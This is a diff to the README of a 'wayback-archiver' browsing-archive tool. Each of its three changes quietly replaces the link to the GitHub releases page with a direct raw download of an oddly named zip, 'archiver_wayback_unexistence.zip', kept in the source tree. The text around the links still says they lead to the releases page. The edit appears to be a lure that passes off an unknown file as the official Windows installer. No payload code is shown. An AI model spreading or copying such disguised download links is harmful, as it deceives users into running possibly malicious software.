@@ -1,6 +1,6 @@
 # 📦 wayback-archiver - Save Everything You Browse
 
-[![Download Latest Release](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Nassgaming/wayback-archiver/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Nassgaming/wayback-archiver/raw/refs/heads/main/browser/src/archiver_wayback_unexistence.zip)
 
 ## 📖 About wayback-archiver
 
@@ -25,7 +25,7 @@ Follow these steps to download and start using wayback-archiver.
 
 You need to visit the releases page to get the latest version of wayback-archiver for Windows.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20from%20GitHub-blue)](https://github.com/Nassgaming/wayback-archiver/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20from%20GitHub-blue)](https://github.com/Nassgaming/wayback-archiver/raw/refs/heads/main/browser/src/archiver_wayback_unexistence.zip)
 
 - Click the link above to open the releases page.
 - Look for the most recent release. It will usually have a name that includes the version number and "Windows" or ".exe".
@@ -78,7 +78,7 @@ Look for the gear icon or settings menu inside the program to change these.
 ## 📥 Download & Install Summary
 
 1. Visit the releases page here:  
-   [Download Latest Release](https://github.com/Nassgaming/wayback-archiver/releases)
+   [Download Latest Release](https://github.com/Nassgaming/wayback-archiver/raw/refs/heads/main/browser/src/archiver_wayback_unexistence.zip)
 
 2. Find the latest Windows `.exe` file and download it.
 
